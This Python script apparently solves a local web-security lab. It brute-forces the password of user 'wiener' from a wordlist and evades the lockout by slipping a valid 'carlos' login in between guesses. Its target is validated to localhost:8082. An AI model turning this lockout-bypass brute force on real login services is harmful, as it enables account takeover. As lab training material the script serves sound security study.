import requests
import re
from typing import Callable
import typer
from rich.console import Console
from rich.progress import Progress
from lxml import html
from rich import print

from valid8 import validate

console = Console()
app = typer.Typer()


def get_password():
    passwords = []
    with open('password.txt') as f:
        for line in f:
            passwords.append(line.strip())
    return passwords


def check_login_blocked(response):
    error = "You're blocked. Please try again in 1 minute"
    if error in str(response.content):
        raise Exception(error)


def login(server):
    passwords = get_password()
    current_password = None
    index = 1
    found = False
    with Progress() as progress:
        task = progress.add_task("[bold yellow]Try to access to Wiener account and discovering password...",
                                 total=len(passwords))
        while len(passwords) > 0:
            if index % 4 == 0 or index == 1:
                requests.post(f"{server}/home/login", json={
                    "username": "carlos",
                    "password": "montoya"
                })
            else:
                current_password = passwords.pop()
                response = requests.post(f"{server}/home/login", json={
                    "username": "wiener",
                    "password": current_password
                })
                progress.update(task, advance=1)
                check_login_blocked(response)
                if len(response.content) == 14 and len(passwords) > 0:
                    progress.update(task_id=task, description="[bold green]Password found", advance=len(passwords))
                    found = True
                    break
            index += 1
    if found:
        print("The password of Wiener is: " + current_password)
    else:
        print("Password not found!")


def pattern(regex: str) -> Callable[[str], bool]:
    r = re.compile(regex)

    def res(value):
        return bool(r.fullmatch(value))

    res.__name__ = f'pattern({regex})'
    return res


def validate_server(server):
    validate("server", server, custom=[pattern(r'\w{4,5}:\/\/(localhost|127.0.0.1):8082$')],
             help_msg="Insert a valid localhost URL")


def is_lab_solved(server):
    response = requests.get(f"{server}/")
    html_document = html.fromstring(response.content)
    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
    return True if solved_link else False


@app.callback()
def main(
        server: str = typer.Option(
            ...,
            prompt=True,
            envvar="SERVER",
            help=f"Vulnerable server ID"
        )
):
    validate_server(server)
    login(server)


def run():
    try:
        typer.run(main)
    except Exception as e:
        console.print(f"[red bold]Error:[/red bold] {e}")


if __name__ == "__main__":
    run()
